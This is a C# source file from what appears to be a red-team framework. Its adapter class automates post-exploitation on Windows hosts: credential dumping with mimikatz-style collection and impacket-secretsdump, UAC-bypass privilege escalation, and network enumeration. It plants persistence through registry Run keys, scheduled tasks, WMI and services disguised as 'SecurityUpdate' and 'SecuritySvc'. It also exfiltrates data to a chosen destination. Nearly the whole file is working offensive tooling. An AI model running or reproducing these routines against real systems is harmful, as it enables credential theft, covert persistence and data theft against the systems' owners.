// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Th1eros

using Rapsodia.Red.Domain.Interfaces;
using Rapsodia.Red.Infrastructure.Exploitation;

namespace Rapsodia.Red.Infrastructure.Adapters;

public class SharpSploitAdapter
{
    private readonly IPostExploitPort _postExploit;
    private readonly KaliToolRunner _runner;
    private readonly MetasploitRpcClient _msf;
    private readonly ILogger<SharpSploitAdapter> _logger;

    public SharpSploitAdapter(IPostExploitPort postExploit, KaliToolRunner runner, MetasploitRpcClient msf, ILogger<SharpSploitAdapter> logger)
    {
        _postExploit = postExploit;
        _runner = runner;
        _msf = msf;
        _logger = logger;
    }

    public async Task<string> DumpCredentialsAsync(string target)
    {
        _logger.LogInformation("Dumping credentials from {Target}", target);
        var mimikatz = await _postExploit.CollectCredentialsAsync(target);
        var hashdump = await _runner.ExecuteAsync("impacket-secretsdump", $"LOCAL/TARGET@{target}", CancellationToken.None);
        _logger.LogWarning("Credentials dumped from {Target}. Hash length: {Len}", target, hashdump.Length);
        return $"{mimikatz}\n{hashdump}";
    }

    public async Task<bool> EscalatePrivilegesAsync(string sessionId)
    {
        _logger.LogWarning("Tentando escalar privilégios na sessão {Session}", sessionId);

        var attempts = new[] { "bypassuac", "bypassuac_injection", "ask" };
        foreach (var technique in attempts)
        {
            var result = await _postExploit.ExecuteCommandAsync(sessionId, technique);
            if (!result.Contains("failed"))
            {
                _logger.LogInformation("Privilege escalation succeeded via {Technique}", technique);
                var sysCheck = await _postExploit.ExecuteCommandAsync(sessionId, "getsystem");
                return !sysCheck.Contains("failed");
            }
        }

        _logger.LogError("All privilege escalation attempts failed for session {Session}", sessionId);
        return false;
    }

    public async Task<bool> DeployPersistenceAsync(string target, string method)
    {
        _logger.LogInformation("Implantando persistência via {Method} em {Target}", method, target);

        var commands = new Dictionary<string, string>
        {
            ["registry"] = @"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Security /d C:\Windows\Temp\agent.exe /f",
            ["scheduled_task"] = @"schtasks /create /tn SecurityUpdate /tr C:\Windows\Temp\agent.exe /sc daily /st 09:00 /f",
            ["wmi"] = @"wmic /node:localhost path Win32_Process call create 'C:\Windows\Temp\agent.exe'",
            ["service"] = @"sc create SecuritySvc binPath= C:\Windows\Temp\agent.exe start= auto && sc start SecuritySvc"
        };

        if (!commands.TryGetValue(method, out var command))
        {
            _logger.LogError("Unknown persistence method: {Method}", method);
            return false;
        }

        await _postExploit.ExecuteCommandAsync(target, command);
        var result = await _postExploit.PersistAsync(target, method);
        _logger.LogWarning("Persistence deployed: {Method} -> {Target} | Success: {Result}", method, target, result);
        return result;
    }

    public async Task<string> EnumerateNetworkAsync(string sessionId)
    {
        _logger.LogInformation("Enumerando rede a partir da sessão {Session}", sessionId);

        var commands = new[] { "ipconfig /all", "netstat -ano", "arp -a", "route print", "net view /domain", "nltest /dclist:" };
        var results = new List<string>();

        foreach (var cmd in commands)
        {
            try
            {
                var output = await _postExploit.ExecuteCommandAsync(sessionId, cmd);
                results.Add($"{cmd}:\n{output}");
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "Falha ao executar {Cmd} na sessão {Session}", cmd, sessionId);
            }
        }

        return string.Join("\n\n", results);
    }

    public async Task<bool> ExfiltrateDataAsync(string sessionId, string sourcePath, string destination)
    {
        _logger.LogInformation("Exfiltrando dados: {Source} -> {Dest}", sourcePath, destination);
        var result = await _postExploit.ExecuteCommandAsync(sessionId, $"compress-and-send {sourcePath} {destination}");
        var success = !result.Contains("failed");
        if (success) _logger.LogWarning("Data exfiltrated: {Source} -> {Dest}", sourcePath, destination);
        return success;
    }
}